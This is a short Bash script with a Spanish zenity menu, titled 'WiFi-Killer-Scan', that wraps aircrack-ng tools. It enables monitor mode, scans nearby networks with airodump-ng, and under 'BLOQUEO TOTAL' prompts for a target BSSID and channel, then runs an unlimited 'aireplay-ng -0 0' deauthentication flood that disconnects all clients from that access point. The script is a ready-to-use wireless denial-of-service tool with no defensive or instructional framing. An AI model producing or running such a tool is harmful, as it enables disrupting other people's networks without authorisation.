#!/bin/bash
# WiFi-Killer-Scan v12.0
while true; do
    CHOICE=$(zenity --list --title="📡 WiFi-Killer-Scan" \
        --column="ID" --column="Acción" \
        1 "⚡ MODO MONITOR" 2 "🔍 ESCANEO" 3 "🔥 BLOQUEO TOTAL" 4 "🌐 RESTAURAR" 5 "❌ SALIR")
    [ $? -ne 0 ] && break
    case $CHOICE in
        1) sudo airmon-ng check kill && sudo airmon-ng start wlan0 ;;
        2) gnome-terminal -- sh -c "sudo airodump-ng wlan0mon; exec bash" ;;
        3) BSSID=$(zenity --entry --text="BSSID:")
           CANAL=$(zenity --entry --text="Canal:")
           sudo iwconfig wlan0mon channel $CANAL
           xterm -hold -fg green -bg black -e "sudo aireplay-ng -0 0 -a $BSSID wlan0mon" & ;;
        4) sudo airmon-ng stop wlan0mon && sudo systemctl restart NetworkManager ;;
        5) exit ;;
    esac
done
